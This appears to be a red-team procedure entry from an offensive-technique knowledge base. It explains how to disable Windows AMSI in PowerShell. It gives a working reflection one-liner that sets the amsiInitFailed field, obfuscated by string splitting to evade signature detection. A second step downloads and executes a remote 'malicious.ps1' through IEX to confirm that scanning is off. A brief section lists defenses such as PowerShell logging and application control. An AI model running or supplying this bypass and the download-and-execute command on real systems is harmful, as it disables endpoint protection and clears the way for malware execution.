---
id: 4e03d037-00e4-464b-9177-af711139ae28
name: Disable AMSI via PowerShell
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:26.410983+00:00'
updated_at: '2023-04-10T20:37:02.880458+00:00'
tactics:
  - '[[Defense Evasion]]'
techniques:
  - '[[Disable or Modify Tools]]'
sub_techniques: []
tags:
  - AMSI
  - PowerShell
  - Windows
  - Defense-Evasion
commands:
  - '[[commands/powershell-disable-amsi]]'
platforms:
  - Windows
tools: []
validated: true
---

# Disable AMSI via PowerShell

## Summary

This procedure disables the Anti Malware Scan Interface (AMSI) in PowerShell, a Windows security feature that scans scripts for malicious content before execution. By using reflection to modify an internal field, attackers can bypass AMSI detection, allowing malicious PowerShell scripts to run without triggering antivirus alerts. This is commonly used in post-exploitation to evade endpoint detection and response (EDR) tools.

## Description

AMSI integrates with PowerShell to inspect dynamic code execution, flagging potentially harmful scripts. Disabling it involves accessing the non-public 'amsiInitFailed' field in the System.Management.Automation.AmsiUtils class via .NET reflection and setting it to true, simulating a failed initialization. This technique requires local execution on a Windows system with PowerShell access and is effective against default AMSI configurations. It maps to MITRE ATT&CK technique T1562.001 (Impair Defenses: Disable or Modify Tools) under the Defense Evasion tactic. Success enables undetected execution of payloads like reverse shells or downloaders, but it may not persist across sessions or against advanced logging.

## Requirements

1. Local access to a Windows system (Windows 10 or later) with PowerShell 3.0 or higher.
2. Execution privileges for PowerShell (typically user-level, but admin may be needed for some environments).
3. No external tools required; uses built-in PowerShell reflection capabilities.

## Defense

- Enable PowerShell logging (Module, ScriptBlock, and Transcription) to capture reflection-based modifications.
- Implement application control policies (e.g., AppLocker or WDAC) to restrict unsigned or reflective code execution.
- Monitor for anomalous PowerShell processes using EDR tools that detect AMSI tampering signatures.
- Regularly audit registry keys related to AMSI and enforce integrity checks.

## Objectives

1. Bypass AMSI scanning to allow execution of malicious PowerShell scripts.
2. Evade detection by integrated antivirus and EDR solutions.
3. Facilitate further post-exploitation activities like payload delivery.

## Instructions

### Step 1: Execute AMSI Disable Command

**Context**: This step uses PowerShell reflection to set the AMSI initialization flag to failed, disabling scanning for the current session. The command employs string obfuscation (concatenation) to avoid static signature detection in logs or AV rules.

**Command** ([[commands/powershell-disable-amsi]]):

Execute the following in a PowerShell prompt:

```powershell
[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)
```

> This command accesses the assembly, retrieves the hidden field, and sets its value to $true. No output is produced on success, but you can verify by attempting to run a known malicious script (e.g., one that AMSI would normally block) without detection.

### Step 2: Verify Disablement

**Context**: Confirm AMSI is disabled by testing with a script that would typically trigger detection, such as a simple obfuscated command that mimics malware behavior.

**Instructions**: Run a test like:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://example.com/malicious.ps1')
```

> If the script executes without AV intervention, AMSI is successfully disabled. Monitor for errors; if AMSI is still active, re-execute the disable command or check for protected environments.
